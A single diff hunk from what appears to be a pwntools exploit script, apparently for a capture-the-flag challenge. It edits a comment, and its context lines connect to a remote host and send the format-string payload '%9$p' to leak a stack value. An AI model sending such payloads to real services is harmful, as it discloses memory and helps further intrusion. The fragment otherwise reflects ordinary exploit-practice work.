@@ -82,7 +82,7 @@ def leak_hex_int(output):
 # Initiate remote connection
 conn = remote(HOST, PORT) 
 
-# Send after we encounter "? " "%9$p"
+# Send "%9$p" after we encounter "? " 
 conn.sendlineafter(b"? ",f"%9$p".encode())
 # Get the result
 out = conn.recvline() 
